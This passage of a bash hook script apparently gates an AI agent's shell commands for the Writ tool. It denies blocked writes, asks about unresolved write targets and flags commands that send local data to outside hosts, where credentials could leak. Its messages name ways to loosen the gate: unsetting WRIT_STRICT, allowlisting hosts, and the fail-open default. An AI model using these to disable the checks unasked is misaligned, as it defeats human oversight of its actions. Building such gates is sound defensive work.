            STRICT_REASON="[ENF-STRICT-001] Writ strict mode (WRIT_STRICT=1): the write gate could not be evaluated (daemon unreachable, local fallback failed), so this Bash write to '$path' fails closed. Start the daemon (systemctl --user start writ-server) or unset WRIT_STRICT."
            log_gate_decision "bash-write" "deny" "$STRICT_REASON" "$path"
            emit_deny "$STRICT_REASON"
            exit 0
        fi
        continue   # no answer obtainable -> fail open (default posture)
    fi
    # The reason comes out of the JSON; the "[Bash write to X]" prefix is assembled in
    # bash. Splitting it that way keeps the target path out of the transform entirely,
    # which is what lets json_transform be used here at all (it takes no --arg).
    # `has("can_write")`, NOT `.can_write // true`. jq's `//` falls through on FALSE as
    # well as null, so `false // true` is true: the deny case would have read as an
    # allow and this gate would have stopped denying. `//` is only safe on a field where
    # false is not a legitimate value; here false IS the whole point.
    BLOCK_REASON=$(printf '%s' "$RESP" | json_transform \
        'if (if has("can_write") then .can_write else true end) then "" else ((.reason // "") | if . == "" then "Write blocked by a Writ gate." else . end) end' \
        "'' if d.get('can_write', True) else (d.get('reason') or 'Write blocked by a Writ gate.')" \
        2>/dev/null) || true
    DENY_REASON=""
    [ -n "$BLOCK_REASON" ] && DENY_REASON="[Bash write to ${path##*/}] $BLOCK_REASON"
    if [ -n "$DENY_REASON" ]; then
        log_gate_decision "bash-write" "deny" "$DENY_REASON" "$path"
        emit_deny "$DENY_REASON"
        exit 0
    fi
    log_gate_decision "bash-write" "allow" "no gate objection" "$path"
done <<< "$TARGETS"

# 2b. Write targets whose expansion could not be resolved: ASK the user. Placed AFTER the
# work-gate loop so every deny above still outranks a confirmation, and immediately BEFORE
# the egress arm because a write target is this gate's primary vector and only one ask can
# fire per command. An unset name expands to NOTHING in a real shell, so the write really
# lands at the filesystem root; the gate cannot know whether the name is set in the shell
# that will run the command, and the honest answer to "this cannot be trusted" is the
# prompt, not silence. See the seventh-instance block in the header for why this is not a
# deny and not a silent allow.
UNKNOWN_HITS=$(printf '%s\n' "$TARGETS" | awk -F'\t' '$1=="unknown"')
if [ -n "$UNKNOWN_HITS" ]; then
    UNK_LIST="" UNK_VARS=""
    while IFS=$'\t' read -r _ukind uword uvar; do
        [ -n "$uword" ] || continue
        # uvar is never empty on an `unknown` row: the extractor sets it to the NAME it
        # could not resolve, which is the whole reason the row exists.
        UNK_LIST="${UNK_LIST}
  - ${uword}   (\$${uvar} is not set in the environment this hook was given)"
        UNK_VARS="${UNK_VARS}${UNK_VARS:+, }\$${uvar}"
    done <<< "$UNKNOWN_HITS"
    UNK_REASON="[ENF-BASH-WRITE-UNRESOLVED] This Bash command writes to a target Writ cannot resolve:
${UNK_LIST}

An unset variable expands to nothing, so a target spelled that way can land at the filesystem root or anywhere else outside this project, and Writ will not claim it is in-project when it cannot tell. Confirm only if you meant to write there. To be gated on the real path instead of asked, spell the destination out, or set the variable in this shell before running the command."
    log_gate_decision "bash-write" "ask" "$UNK_REASON" "$UNK_VARS"
    emit_ask "$UNK_REASON"
    exit 0
fi

# 3. Egress destinations: ASK the user. Placed LAST on purpose -- every deny above
# outranks a confirmation, so this is reached only by a command with nothing stronger
# against it. No mode is read and no server is called here: a pure-egress command has
# no write target, so the loop above never ran.
EGRESS_HITS=$(printf '%s\n' "$TARGETS" | awk -F'\t' '$1=="egress"')
if [ -n "$EGRESS_HITS" ]; then
    DESTS="" HOSTS=""
    while IFS=$'\t' read -r _ehit_kind ehost edetail; do
        [ -n "$ehost" ] || continue
        DESTS="${DESTS}
  - ${ehost}${edetail:+ -- }${edetail}"
        HOSTS="${HOSTS}${HOSTS:+, }${ehost}"
    done <<< "$EGRESS_HITS"
    ASK_REASON="[SEC-BASH-EGRESS] This Bash command appears to SEND local data off this machine:
${DESTS}

Writ cannot tell whether that payload carries repository or credential material, so it asks instead of guessing. Confirm only if you meant to transfer this. To stop being asked about a destination you trust, add its host to writ.toml [egress] allow_hosts, or export WRIT_EGRESS_ALLOW_HOSTS=host1,host2. localhost, 127.0.0.1, ::1 and the Writ daemon host never prompt."
    log_gate_decision "bash-egress" "ask" "$ASK_REASON" "$HOSTS"
    emit_ask "$ASK_REASON"
    exit 0
fi

exit 0
